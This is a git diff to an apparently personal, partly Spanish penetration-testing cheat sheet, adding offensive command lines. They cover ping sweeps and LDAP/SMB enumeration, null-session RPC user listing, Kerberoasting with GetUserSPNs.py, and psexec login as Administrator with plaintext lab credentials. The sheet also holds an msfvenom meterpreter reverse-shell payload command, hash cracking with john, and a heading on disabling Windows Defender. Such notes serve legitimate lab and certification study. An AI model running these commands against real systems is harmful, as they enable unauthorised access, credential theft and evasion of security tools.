@@ -79,6 +79,8 @@ host and service enumeration
 //discover devices inside the network eth0
 netdiscover -i eth0
 nmap -sN 10.10.10.0/24
+for /L %V in (1 1 254) do PING -n 1 192.168.0.%V | FIND /I "TTL"
+
 // enumeration
 netstat -a 10.10.10.10 // netstat enumeration netbios
 snmp-check 10.10.10.10 // extract users from netbios - parrot
@@ -197,11 +199,19 @@ Comando snmpwalk con SNMPv3 (autenticación y cifrado):
 snmpwalk -v3 -l authPriv -u [nombre de usuario] -a MD5 -A [contraseña de usuario] -x DES -X [contraseña DES] [dirección IP del host] [OID de la MIB de la información del sistema]
 Comando snmpwalk con SNMPv3 (sin autenticación ni cifrado):
 snmpwalk -v3 -l noAuthNoPriv -u [nombre de usuario] [dirección IP del host] [OID de la MIB de la info rmación del sistema]
-
-
-•	SoftPerfect Network Scanner – Tool Windows
-•	AD Explorer – LDAP Enumerator
-
+````
+````
+SoftPerfect Network Scanner – Tool Windows
+````
+LDAP Enumerator
+````
+AD Explorer 
+ldapsearch
+ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.178.29
+ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W
+ldapsearch -x -b "dc=devconnected,dc=com" -H ldap://192.168.178.29 -D "cn=admin,dc=devconnected,dc=com" -W 
+ldapsearch <previous_options> "uid=jo*"
+````
 ````
 //DNS Enum
 ````js
@@ -226,6 +236,41 @@ TXT
 ////Other Enum
 ````js
 Enum4linux
+Port:445/TCP
+
+poetry run crackmapexec smb <IP/DNS>
+
+poetry run crackmapexec smb <IP/DNS> -u '<usuario>' -p '<password>' --shares
+
+smbclient -L <IP/DNS>
+
+Smbmap -H <IP/DNS>
+
+Smbmap -H <IP/DNS> -r <RUTA>
+
+Smbmap -H <IP/DNS> --download <archivo>
+
+gpp-decrypt <HASH PASSWORD>
+
+rpcclient -U '<usuario>%<password>' <IP/DNS> 
+
+rpcclient -U '<usuario>%<password>' <IP/DNS> -c <Help>
+
+rpcclient -U "" <IP  -N
+Rpcclient -u "" <IP> -N
+
+Rpcclient -u "" <IP> -N -c <comando: enumdousers> 
+
+Rpcclient -u "" <IP> -N -c <comando: enumdomusers> | grep -oP '\[.*?\]'  | grep -v 0x | tr -d '[]'
+
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
+
+
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+
+
+python3 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
+
 ````
 
 #### enumerating -samba
@@ -242,6 +287,34 @@ Nessus
 OpenVAS
 Nikto – Web Vulnerability
 arachni
+nikto -h url -Cgidirs all
+Netsparker Application Security Scanner — Application security scanner to automatically find security flaws.
+
+Nikto — Noisybut fast black box web server and web application vulnerability scanner.
+
+Arachni — Scriptableframework for evaluating the security of web applications.
+
+w3af — Webapplication attack and audit framework.
+
+Wapiti — Blackbox web application vulnerability scanner with built-in fuzzer.
+
+SecApps — In-browserweb application security testing suite.
+
+WebReaver — Commercial,graphical web application vulnerability scanner designed for macOS.
+
+WPScan — Blackbox WordPress vulnerability scanner.
+
+Zoom — Powerfulwordpress username enumerator with infinite scanning.
+
+cms-explorer — Revealthe specific modules,plugins,components and themes that various websites powered by content management systems are running.
+
+joomscan — Joomlavulnerability scanner.
+
+ACSTIS — Automatedclient-side template injection (sandboxescape/bypass)detection for AngularJS.
+
+SQLmate — Afriend of sqlmap that identifies sqli vulnerabilities based on a given dork and website![image](https://user-images.githubusercontent.com/32601403/221203684-411db2d8-5e9c-4d16-830c-6fad943ffda2.png)
+
+
 ````
 6.	SYSTEMS HACKING
 ````js
@@ -259,6 +332,13 @@ https://www.variotdbs.pl/  search exploit
 https://sploitus.com/ search exploit
 searchsploit – tool linux
 nsfvenom -p windows/meterpeter/reverse_tcp –platform windows -a x86 -f exe LHOST=<> LPORT=<> -o salida
+-p plataforma
+-a arquitectura
+-f Formato de archivo de salida
+LHOST lisent host
+LPORT lisent port
+-o Salida
+
 https://github.com/PowerShellMafia/PowerSploit - Post explotacion 
 TheFatRat
  Inmunity Debugger
@@ -267,6 +347,13 @@ TheFatRat
 ````js
 // dir enumeration
 gobuster dir -u 10.10.. -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -q
+gobuster dir -u http://training.breakthecode.com/ -w /usr/local/dirbuster/directory-list-2.3-medium.txt -x .xml -t 4
+ffuf -H "Host: FUZZ.<DNS>" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<IP> -fs 169
+https://sourceforge.net/projects/dirbuster/
+
+Java -jar Dirbuster-0.12.jar
+
+
 dir : directory listing
 -u : host
 -w : wordlists
@@ -362,6 +449,14 @@ john --format=Raw-MD5 hash --wordlist=/usr/share/wordlists/rockyou.txt
 ### to show the hash cracked
 john --show --format=Raw-MD5 hash
 - --show = show the hash:Cracked
+
+John -list=formats
+
+
+Escogemos un formato
+
+
+John --format=RAW-md5 --wordlist=<RUTA> <HASH>
 ````
 **cryptography**
 ```js
@@ -373,6 +468,8 @@ it will compare both files what we need get the md5
 // HashMyFiles
 it allow you to hash all the files inside a folder
 // Veracrypt
+Hash-identifier <HASH>
+
 ```
 **rainbowtables**
 ```js
@@ -573,6 +670,16 @@ searchsploit -m 7618 // Paste the exploit in the current directory
 searchsploit -p 7618[.c] // Show complete path
 searchsploit — nmap file.xml // Search vulns inside a Nmap XML result
 ``` 
+
+comando para buscar archivos en Windows con powershell
+``` 
+Get-ChildItem C:\ -Filter *.pst -Recurse 
+``` 
+Administrar y Desahabilitar Windows Defender
+``` 
+Get-Command -Module Defender
+``` 
+
 2.	FOOTPRINTING
 
 
